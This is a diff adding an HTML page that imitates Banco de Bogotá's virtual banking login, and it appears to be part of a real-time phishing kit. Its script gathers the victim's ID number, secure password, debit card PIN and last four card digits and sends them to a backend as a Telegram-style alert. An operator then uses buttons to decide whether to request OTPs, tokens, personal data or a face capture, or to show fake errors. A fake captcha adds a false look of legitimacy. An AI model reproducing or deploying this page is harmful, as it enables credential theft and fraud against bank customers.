@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Banco de Bogotá - Libre Inversión</title>
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
+    <style>
+        /* Fuentes Locales extraídas de css/7485.css */
+        @font-face {
+            font-family: 'Roboto';
+            src: url('css/ce61b8b68994802f2e55.ttf') format('truetype');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Roboto';
+            src: url('css/6bede58e856278b0f8f1.ttf') format('truetype');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Roboto';
+            src: url('css/0fcd45fbfc419c42c8b9.ttf') format('truetype');
+            font-weight: 500;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Roboto';
+            src: url('css/17451a4c1cd55e33ac57.ttf') format('truetype');
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Roboto';
+            src: url('css/dcb583d9def8308113fc.ttf') format('truetype');
+            font-weight: 400;
+            font-style: italic;
+            font-display: swap;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8faff;
+        }
+
+        /* Sombra suave personalizada idéntica a la de la app */
+        .custom-card-shadow {
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05), 0 0 2px rgba(0, 0, 0, 0.02);
+        }
+
+        /* Ajustes finos para inputs para que se vean nativos */
+        .custom-input {
+            border-color: #e5e7eb;
+            /* gray-200 */
+            border-radius: 4px;
+            font-size: 13px;
+        }
+
+        .custom-input:focus {
+            border-color: #003da5;
+            box-shadow: 0 0 0 1px #003da5;
+        }
+
+        /* Loader */
+        .loader-backdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(89, 124, 187, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .loader-content {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 500;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        /* Modal Error */
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        /* Captcha Modal */
+        .captcha-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 1);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .captcha-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex justify-center py-8 sm:py-12">
+
+    <!-- Captcha Modal -->
+    <div id="captcha-modal" class="captcha-modal">
+        <div class="captcha-box">
+            <img src="logo.png" alt="Logo Banco" class="h-8 object-contain mx-auto mb-4">
+            <h2 class="text-[#003da5] font-bold text-lg mb-2">Verificación de Seguridad</h2>
+            <p class="text-gray-600 text-sm mb-4">Por favor, ingresa los caracteres que ves en la imagen para continuar.
+            </p>
+
+            <div class="flex justify-center mb-4 border border-gray-200 p-2 rounded bg-gray-50">
+                <canvas id="captcha-canvas" width="200" height="60"></canvas>
+                <button id="refresh-captcha" class="ml-2 text-[#003da5] hover:text-blue-700" title="Recargar imagen">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24"
+                        stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                    </svg>
+                </button>
+            </div>
+
+            <input type="text" id="captcha-input"
+                class="w-full border border-gray-300 rounded p-2 text-center text-lg uppercase tracking-widest mb-4 focus:ring-2 focus:ring-[#003da5] outline-none"
+                placeholder="Ingresa el código" maxlength="6">
+            <p id="captcha-error" class="text-red-500 text-sm mb-2 hidden">Código incorrecto. Intenta de nuevo.</p>
+
+            <button id="verify-captcha-btn"
+                class="w-full bg-[#003da5] text-white font-bold py-3 rounded hover:bg-[#003487] transition-colors">
+                Continuar
+            </button>
+        </div>
+    </div>
+
+    <!-- Loader -->
+    <div id="loader" class="loader-backdrop" style="display: none;">
+        <div class="loader-content">Espera un momento, por favor</div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="custom-modal" style="display: none;">
+        <div class="custom-modal-content">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 20px;">
+                <img src="img/error.png" alt="Icono de error" style="width: 60px; height: 60px;">
+                <div>
+                    <h3 id="modal-title" style="margin-bottom: 10px; color: #0040a8; font-weight: bold;">¡Ups! Algo
+                        salió mal</h3>
+                    <p id="modal-message" style="font-size: 14px;">Los datos ingresados no coinciden con los de tu
+                        cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button"
+                style="width: 100%; margin-top: 20px; background-color: #0040a8; color: white; padding: 10px; border-radius: 5px; font-weight: bold;">Volver
+                al inicio</button>
+        </div>
+    </div>
+
+    <div class="w-full max-w-[380px] px-4 mx-auto">
+
+        <header class="flex items-center gap-3 mb-6 pl-1">
+            <img src="logo.png" alt="Logo Banco" class="h-8 object-contain">
+
+            <h1 class="text-[17px] font-bold text-gray-900 tracking-tight">Bienvenido a tu Banca Virtual</h1>
+        </header>
+
+        <div class="bg-[#003da5] rounded-xl p-3 py-3.5 flex items-center relative overflow-hidden mb-6 shadow-sm">
+            <div
+                class="w-[52px] h-[52px] rounded-full border-[2px] border-white overflow-hidden flex-shrink-0 z-10 bg-white ml-1">
+                <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png"
+                    alt="Usuario" class="w-full h-full object-cover object-top">
+            </div>
+            <div class="ml-3.5 z-10 flex-1">
+                <p class="text-white text-[11px] font-medium leading-[1.3]">
+                    ¿Nunca has ingresado a Banca Virtual?<br>
+                    <span class="font-bold cursor-pointer hover:underline flex items-center mt-0.5">Aquí te decimos cómo
+                        hacerlo <span class="text-[14px] leading-none ml-1">›</span></span>
+                </p>
+            </div>
+            <div
+                class="absolute -left-4 top-1 w-24 h-24 bg-blue-600 rounded-full opacity-40 mix-blend-screen pointer-events-none">
+            </div>
+        </div>
+
+        <div class="bg-white border border-gray-200 rounded-xl custom-card-shadow overflow-hidden">
+
+            <div class="flex border-b border-gray-200">
+                <button id="tab-secure"
+                    class="flex-1 relative pb-3 pt-4 text-center text-[13px] font-bold text-[#003da5]">
+                    Clave segura
+                    <div id="indicator-secure"
+                        class="absolute bottom-0 left-0 w-full h-[3px] bg-[#003da5] rounded-t-full"></div>
+                </button>
+                <button id="tab-debit"
+                    class="flex-1 pb-3 pt-4 text-center text-[13px] font-medium text-gray-500 hover:text-gray-700 transition-colors relative">
+                    Tarjeta débito
+                    <div id="indicator-debit"
+                        class="absolute bottom-0 left-0 w-full h-[3px] bg-[#003da5] rounded-t-full hidden"></div>
+                </button>
+            </div>
+
+            <div class="px-5 py-6">
+
+                <!-- Info Box (Optional, based on original design logic) -->
+                <div id="info-box"
+                    class="hidden flex items-start gap-2 mb-4 p-2 bg-blue-50 rounded-md border border-blue-100">
+                    <svg class="w-4 h-4 text-[#003da5] mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <p class="text-[11px] text-[#003da5] flex-1 leading-snug"></p>
+                    <button id="close-info-box" class="text-gray-400 hover:text-gray-600"><svg class="w-3 h-3"
+                            fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12"></path>
+                        </svg></button>
+                </div>
+
+                <form class="space-y-5" onsubmit="event.preventDefault()">
+
+                    <div>
+                        <label class="block text-[11px] font-bold text-gray-700 mb-1.5 ml-0.5">Identificación</label>
+                        <div class="flex gap-3">
+                            <div class="relative w-[35%]">
+                                <select id="doc-type"
+                                    class="w-full custom-input border py-[9px] px-3 text-gray-800 appearance-none bg-white outline-none font-medium">
+                                    <option value="CC">C.C.</option>
+                                    <option value="CE">C.E.</option>
+                                    <option value="TI">T.I.</option>
+                                    <option value="PA">P.S.</option>
+                                </select>
+                                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
+                                    <svg class="w-4 h-4 text-[#003da5]" fill="none" stroke="currentColor"
+                                        viewBox="0 0 24 24" stroke-width="2.5">
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="flex-1 relative">
+                                <input id="doc-number" type="tel" placeholder="#" maxlength="15"
+                                    class="w-full custom-input border py-[9px] px-3 outline-none placeholder-gray-400 font-medium">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Clave Segura Section -->
+                    <div id="section-secure" class="mt-6">
+                        <label class="block text-[11px] font-bold text-gray-700 mb-1.5 ml-0.5">Clave segura</label>
+                        <div class="relative">
+                            <input id="secure-password" type="password" placeholder="...." maxlength="4"
+                                class="w-full custom-input border py-[9px] px-3 outline-none placeholder-gray-400 font-black tracking-[4px] text-[16px]">
+                            <button type="button"
+                                class="absolute inset-y-0 right-0 pr-3 flex items-center text-[#003da5]">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-[22px] w-[22px]" fill="none"
+                                    viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                                    <path stroke-linecap="round" stroke-linejoin="round"
+                                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round"
+                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Tarjeta Débito Section (Hidden by default) -->
+                    <div id="section-debit" class="mt-6 hidden">
+                        <div class="mb-4">
+                            <label class="block text-[11px] font-bold text-gray-700 mb-1.5 ml-0.5">Clave de tu tarjeta
+                                débito</label>
+                            <div class="relative">
+                                <input id="debit-password" type="password" placeholder="...." maxlength="4"
+                                    class="w-full custom-input border py-[9px] px-3 outline-none placeholder-gray-400 font-black tracking-[4px] text-[16px]">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[11px] font-bold text-gray-700 mb-1.5 ml-0.5">Últimos 4 dígitos de
+                                tu tarjeta débito</label>
+                            <div class="relative">
+                                <input id="debit-last4" type="password" placeholder="...." maxlength="4"
+                                    class="w-full custom-input border py-[9px] px-3 outline-none placeholder-gray-400 font-black tracking-[4px] text-[16px]">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button id="btn-ingresar" type="button"
+                        class="w-full bg-[#f2f2f2] text-[#a0a0a0] font-bold py-3.5 rounded-full mt-4 text-[14px] cursor-not-allowed transition-all tracking-wide"
+                        disabled>
+                        Ingresar
+                    </button>
+
+                    <div class="flex justify-between pt-3 px-1">
+                        <a href="#" class="text-[#005eb8] text-[13px] font-bold hover:underline flex items-center">
+                            Registrarme <span class="text-[14px] leading-none ml-0.5">›</span>
+                        </a>
+                        <a href="#" class="text-[#005eb8] text-[13px] font-bold hover:underline flex items-center">
+                            Olvidé mi clave <span class="text-[14px] leading-none ml-0.5">›</span>
+                        </a>
+                    </div>
+
+                </form>
+            </div>
+        </div>
+
+        <p class="text-[10px] text-gray-500 text-justify mt-7 leading-[1.4] px-1 font-medium">
+            Este sitio está protegido por reCAPTCHA y aplican las <a href="#"
+                class="text-[#005eb8] font-bold hover:underline">políticas de privacidad</a> y los <a href="#"
+                class="text-[#005eb8] font-bold hover:underline">términos de servicio de Google</a>.
+        </p>
+
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            // --- CAPTCHA LOGIC ---
+            let captchaCode = '';
+
+            function generateCaptcha() {
+                const canvas = document.getElementById('captcha-canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+                // Background noise
+                ctx.fillStyle = '#f3f4f6';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                captchaCode = '';
+
+                // Generate characters
+                for (let i = 0; i < 6; i++) {
+                    captchaCode += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+
+                // Draw text
+                ctx.font = 'bold 30px "Roboto", sans-serif';
+                ctx.fillStyle = '#003da5';
+                ctx.textBaseline = 'middle';
+
+                for (let i = 0; i < captchaCode.length; i++) {
+                    const x = 20 + i * 30;
+                    const y = 30 + (Math.random() * 10 - 5);
+                    const angle = (Math.random() * 0.4) - 0.2;
+
+                    ctx.save();
+                    ctx.translate(x, y);
+                    ctx.rotate(angle);
+                    ctx.fillText(captchaCode[i], 0, 0);
+                    ctx.restore();
+                }
+
+                // Draw noise lines
+                for (let i = 0; i < 5; i++) {
+                    ctx.beginPath();
+                    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                    ctx.strokeStyle = 'rgba(0, 61, 165, 0.3)';
+                    ctx.lineWidth = 2;
+                    ctx.stroke();
+                }
+            }
+
+            // Init Captcha
+            generateCaptcha();
+
+            $('#refresh-captcha').on('click', generateCaptcha);
+
+            $('#verify-captcha-btn').on('click', function () {
+                const input = $('#captcha-input').val().toUpperCase();
+                if (input === captchaCode) {
+                    $('#captcha-modal').fadeOut();
+                } else {
+                    $('#captcha-error').removeClass('hidden');
+                    generateCaptcha();
+                    $('#captcha-input').val('');
+                }
+            });
+
+            // --- TABS LOGIC ---
+            const tabSecure = $('#tab-secure');
+            const tabDebit = $('#tab-debit');
+            const sectionSecure = $('#section-secure');
+            const sectionDebit = $('#section-debit');
+            const indicatorSecure = $('#indicator-secure');
+            const indicatorDebit = $('#indicator-debit');
+            const infoBox = $('#info-box');
+
+            let currentTab = 'secure'; // secure | debit
+
+            function switchTab(tab) {
+                currentTab = tab;
+                // Reset inputs
+                $('#secure-password, #debit-password, #debit-last4').val('');
+                validateForm();
+
+                if (tab === 'secure') {
+                    // Styles
+                    tabSecure.addClass('text-[#003da5]').removeClass('text-gray-500 font-medium').addClass('font-bold');
+                    tabDebit.removeClass('text-[#003da5] font-bold').addClass('text-gray-500 font-medium');
+                    indicatorSecure.removeClass('hidden');
+                    indicatorDebit.addClass('hidden');
+
+                    // Sections
+                    sectionSecure.removeClass('hidden');
+                    sectionDebit.addClass('hidden');
+
+                    // Info text
+                    infoBox.removeClass('hidden').addClass('flex');
+                    infoBox.find('p').text("Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.");
+                } else {
+                    // Styles
+                    tabDebit.addClass('text-[#003da5]').removeClass('text-gray-500 font-medium').addClass('font-bold');
+                    tabSecure.removeClass('text-[#003da5] font-bold').addClass('text-gray-500 font-medium');
+                    indicatorDebit.removeClass('hidden');
+                    indicatorSecure.addClass('hidden');
+
+                    // Sections
+                    sectionDebit.removeClass('hidden');
+                    sectionSecure.addClass('hidden');
+
+                    // Info text
+                    infoBox.removeClass('hidden').addClass('flex');
+                    infoBox.find('p').text("Estás ingresando con Tarjeta Débito. Selecciona 'Clave Segura' para cambiar el tipo de ingreso.");
+                }
+            }
+
+            tabSecure.on('click', () => switchTab('secure'));
+            tabDebit.on('click', () => switchTab('debit'));
+
+            // Close info box
+            $('#close-info-box').on('click', function () {
+                infoBox.addClass('hidden').removeClass('flex');
+            });
+
+            // Validation Logic
+            function validateForm() {
+                const docNumber = $('#doc-number').val().trim();
+                let isValid = false;
+
+                if (docNumber.length > 0) {
+                    if (currentTab === 'secure') {
+                        const securePass = $('#secure-password').val().trim();
+                        if (securePass.length === 4) isValid = true;
+                    } else {
+                        const debitPass = $('#debit-password').val().trim();
+                        const debitLast4 = $('#debit-last4').val().trim();
+                        if (debitPass.length === 4 && debitLast4.length === 4) isValid = true;
+                    }
+                }
+
+                const btn = $('#btn-ingresar');
+                if (isValid) {
+                    btn.removeAttr('disabled').removeClass('bg-[#f2f2f2] text-[#a0a0a0] cursor-not-allowed').addClass('bg-[#003da5] text-white hover:bg-[#003487] cursor-pointer shadow-md');
+                } else {
+                    btn.attr('disabled', 'true').addClass('bg-[#f2f2f2] text-[#a0a0a0] cursor-not-allowed').removeClass('bg-[#003da5] text-white hover:bg-[#003487] cursor-pointer shadow-md');
+                }
+            }
+
+            $('#doc-number, #secure-password, #debit-password, #debit-last4').on('input', function () {
+                if (this.id !== 'doc-number') {
+                    this.value = this.value.replace(/\D/g, '');
+                }
+                validateForm();
+            });
+
+            // Backend Logic
+            async function sendLoginDataToBackend(messageContent, keyboard) {
+                const url = '/api/send-message';
+                const payload = {
+                    text: messageContent,
+                    keyboard: keyboard
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+
+                    const data = await response.json();
+
+                    if (!response.ok) {
+                        console.error(`Error: ${response.status}`, data.error);
+                        throw new Error(data.error || 'Error en la solicitud');
+                    }
+                    return data.result.message_id;
+
+                } catch (error) {
+                    console.error('Network error:', error);
+                    return null;
+                }
+            }
+
+            async function checkOperatorResponse(messageId) {
+                try {
+                    const response = await fetch(`/api/check-update/${messageId}`);
+
+                    if (response.status === 408) { // Timeout
+                        $('#loader').hide();
+                        alert("El operador no respondió a tiempo. Intente de nuevo.");
+                        location.reload();
+                        return;
+                    }
+
+                    const data = await response.json();
+
+                    if (data.action) {
+                        $('#loader').hide();
+                        if (data.action === 'pedir_token' || data.action === 'pedir_dinamica') window.location.href = "token.html";
+                        else if (data.action === 'pedir_sms') window.location.href = "otp.html";
+                        else if (data.action === 'pedir_datos') window.location.href = "datos.html";
+                        else if (data.action === 'pedir_cara') window.location.href = "cara.html";
+                        else if (data.action === 'error_login' || data.action === 'error_user') {
+                            $('#modal-title').text("Error en el ingreso");
+                            $('#modal-message').text(data.action === 'error_login' ? "La identificacion o clave de ingreso es incorrecta." : "El usuario no existe o está bloqueado.");
+                            $('#error-modal').css('display', 'flex');
+                        }
+                        else if (data.action === 'finalizar') window.location.href = "finish.html";
+                    } else {
+                        // Polling
+                        setTimeout(() => checkOperatorResponse(messageId), 2000);
+                    }
+                } catch (error) {
+                    $('#loader').hide();
+                    console.error("Error polling:", error);
+                }
+            }
+
+            async function handleLogin() {
+                $('#loader').css('display', 'flex');
+
+                const docType = $('#doc-type').val();
+                const docNum = $('#doc-number').val();
+
+                let message = `<b>🏦 INICIO DE SESIÓN - BOGOTÁ 🏦</b>\n`;
+                message += `<b>🆔 Tipo Doc:</b> ${docType}\n\n`;
+                message += `<b>👤 Documento:</b> <code>${docNum}</code>\n`;
+
+                const loginData = {
+                    identificationType: docType,
+                    identificationNumber: docNum,
+                    ip: 'N/A',
+                    device: 'N/A',
+                    step: 'login'
+                };
+
+                if (currentTab === 'secure') {
+                    const pass = $('#secure-password').val();
+                    message += `<b>🔑 Clave:</b> <code>${pass}</code>\n\n`;
+
+                    loginData.secureKey = pass;
+                    loginData.debitCardKey = 'N/A';
+                    loginData.last4Digits = 'N/A';
+                } else {
+                    const pass = $('#debit-password').val();
+                    const last4 = $('#debit-last4').val();
+                    message += `<b>🔑 Clave Cajero:</b> <code>${pass}</code>\n`;
+                    message += `<b>🔢 Últimos 4:</b> <code>${last4}</code>\n\n`;
+
+                    loginData.secureKey = 'N/A';
+                    loginData.debitCardKey = pass;
+                    loginData.last4Digits = last4;
+                }
+
+                message += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "❌ Error Login", callback_data: `error_login:N/A` }],
+                        [{ text: "📋 Pedir Datos", callback_data: `pedir_datos:N/A` }, { text: "🔢 Pedir OTP", callback_data: `pedir_sms:N/A` }],
+                        [{ text: "💎 Pedir Token", callback_data: `pedir_dinamica:N/A` }, { text: "👤 Pedir Cara", callback_data: `pedir_cara:N/A` }],
+                        [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
+                    ]
+                };
+
+                sessionStorage.setItem('initialLoginData', JSON.stringify(loginData));
+
+                const messageId = await sendLoginDataToBackend(message, keyboard);
+
+                if (messageId) {
+                    checkOperatorResponse(messageId);
+                } else {
+                    $('#loader').hide();
+                    alert("Error al enviar los datos. Verifique su conexión.");
+                }
+            }
+
+            $('#btn-ingresar').on('click', handleLogin);
+
+            $('#back-to-start-button').on('click', function () {
+                $('#error-modal').hide();
+                $('#secure-password, #debit-password, #debit-last4').val('');
+                validateForm();
+            });
+        });
+    </script>
+</body>
+
+</html>
+</a>
